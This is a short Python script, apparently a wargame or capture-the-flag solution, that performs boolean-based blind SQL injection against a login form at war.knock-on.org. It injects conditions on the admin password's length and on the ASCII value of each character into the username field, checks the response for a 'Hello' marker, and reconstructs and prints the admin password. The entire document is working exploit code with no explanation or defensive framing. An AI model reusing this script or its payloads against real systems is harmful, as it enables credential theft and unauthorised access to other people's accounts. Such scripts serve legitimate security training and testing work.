import requests

def check_length(url):

    for num in range(0,100):
        param={"username":f"admin' && length(password) like {num} -- 1", "password":"123"}
        
        res=requests.post(url,data=param)
        if("Hello" in res.text):
            return num

def find_char(url,length):
    string = ""
    for n in range(1,length+1):
        print(f"{n}번째 문자 탐색")
        for char in range(32,127):
            param={"username":f"admin' && ascii(substr(password,{n},1)) like {char} -- 1", "password":"123"}
            res=requests.post(url,data=param)
            if("Hello" in res.text):
                print("find!" + chr(char))
                string += chr(char)
                break
    return string

url = "http://war.knock-on.org:10004/login"
length = check_length(url)
find_char = find_char(url,length)
print("admin password : " +  find_char)